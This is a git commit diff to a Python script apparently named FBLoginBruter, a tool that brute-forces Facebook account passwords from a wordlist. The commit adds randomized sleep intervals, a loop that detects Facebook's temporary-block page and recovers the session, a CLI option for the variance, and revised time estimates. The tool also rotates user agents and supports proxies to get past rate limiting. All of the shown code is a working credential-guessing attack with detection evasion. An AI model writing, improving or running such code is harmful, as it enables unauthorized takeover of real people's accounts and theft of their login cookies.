fb6719d4650ae7e7163935e80376077d822e014a
tibotix <tizian@seehaus.net>
2022-12-05 12:58:38 +0100

    [enh] Add sleep variance for cooldown

--- src/login_brute.py
+++ src/login_brute.py
@@ -1,4 +1,5 @@
 import datetime
+import random
 import argparse
 import platform
 import time
@@ -88,29 +89,47 @@ class FBLoginBruter:
         self.post_data_format = f"lsd={lsd!s}&jazoest={jazoest!s}&cuid={cuid}&flow=initiate_view&pass={{password}}"
         return True
     
-    def try_pass(self, password):
+    def _try_pass(self, password):
         headers = {"User-Agent": self.user_agent_rotator.get_random_user_agent(), "Content-Type": "application/x-www-form-urlencoded"}
         r = self.ses.post(LOGIN_URL, self.post_data_format.format(password=password), headers=headers, allow_redirects=False)
         correct_password = r.status_code == 302 and "c_user" in r.cookies
         return correct_password, r
+    
+    def try_pass(self, password):
+        correct_password, r = self._try_pass(password)
+        while self._is_request_blocked(r):
+            self._set_blocked()
+            self._initiate_recover_session_with_retries()
+            correct_password, r = self._try_pass(password)
+        self._set_unblocked()
+        return correct_password, r
+    
+    def _set_blocked(self):
+        if not self.blocked:
+            self.warning("We are blocked!")
+            self.blocked = True
+    
+    def _set_unblocked(self):
+        if self.blocked:
+            self.info("We are unblocked :) Continue...")
+            self.blocked = False
 
     def _is_request_blocked(self, r):
         return r.status_code == 200 and "Du wurdest vorübergehend blockiert" in r.text
 
     def _print_debug_request(self, password, idx, r):
         self.debug(f"[{password!s}][{idx!s}] {r.status_code} {str(r.cookies)} {r.headers.get('Location', '<Location header not found>')}")
-
-    def _handle_blocked(self):
-        self.warning("We are blocked!")
-        while self._is_request_blocked(self.try_pass("test")[1]):
-            self._initiate_recover_session_with_retries()
-        self.info("We are unblocked :) Continue...")
     
     def _estimate_time_for_wordlist_length(self, length):
-        seconds_per_pass = 2
-        initiate_recover_session_after = 500
+        seconds_per_pass = self.cooldown_time + 2
+        initiate_recover_session_after = 350
         initiate_recover_session_time = 30 * 60
         return round(((seconds_per_pass * length) + ((length / initiate_recover_session_after)*initiate_recover_session_time)) / 60 / 60, 2)
+    
+    def _cooldown(self):
+        min_cooldown_time = max(0, self.cooldown_time - self.sleep_variance)
+        max_cooldown_time = self.cooldown_time + self.sleep_variance
+        time.sleep(random.randint(min_cooldown_time, max_cooldown_time))
 
     def brute(self, passwords):
         self.info("Starting Login brute force attack...")
@@ -120,9 +139,6 @@ class FBLoginBruter:
         for idx, password in enumerate(filter(lambda p:p, passwords)):
             self.info(f"{idx!s}/{len(passwords)!s}", end="\r")
             correct_password, r = self.try_pass(password)
-            while self._is_request_blocked(r):
-                self._handle_blocked()
-                correct_password, r = self.try_pass(password)
             if len(r.cookies) > 0:
                 self.info(f"[{idx!s}] Cookies: {str(r.cookies)}")
             if idx % 10 == 0:
@@ -133,7 +149,7 @@ class FBLoginBruter:
                 for k,v in r.cookies.items():
                     self.info(f"{k!s}: {v!s}")
                 return True
-            time.sleep(self.cooldown_time)
+            self._cooldown()
         return False
 
 def main():
@@ -142,6 +158,7 @@ def main():
     parser.add_argument("wordlist", type=argparse.FileType("r"), help="Filepath of the wordlist to use.")
     parser.add_argument("--offset", "-o", type=int, default=0, help="Wordlist offset.")
     parser.add_argument("--cooldown-time", type=int, default=20, help="Time in seconds to sleep between every login attempt.")
+    parser.add_argument("--sleep-variance", type=int, default=5, help="Time in seconds the sleep between every login attempt will vary randomly.")
     parser.add_argument("--blocking-pause", type=int, default=3000, help="Time in seconds to wait after we are blocked.")
     parser.add_argument("--proxy", "-p", type=str, help="Proxy to use for all requests.")
     parser.add_argument("--verbose", "-v", action="store_true", default=False, help="Enable verbose mode.")
@@ -151,7 +168,7 @@ def main():
     if args.proxy:
         proxies = {"http": f"http://{args.proxy}", "https": f"https://{args.proxy}"}
 
-    bruter = FBLoginBruter(args.email_or_phone, args.cooldown_time, args.blocking_pause, proxies, args.verbose)
+    bruter = FBLoginBruter(args.email_or_phone, args.cooldown_time, args.sleep_variance, args.blocking_pause, proxies, args.verbose)
     if not bruter.brute(args.wordlist.read().splitlines()[args.offset:]):
         print("Password not found :(")
 
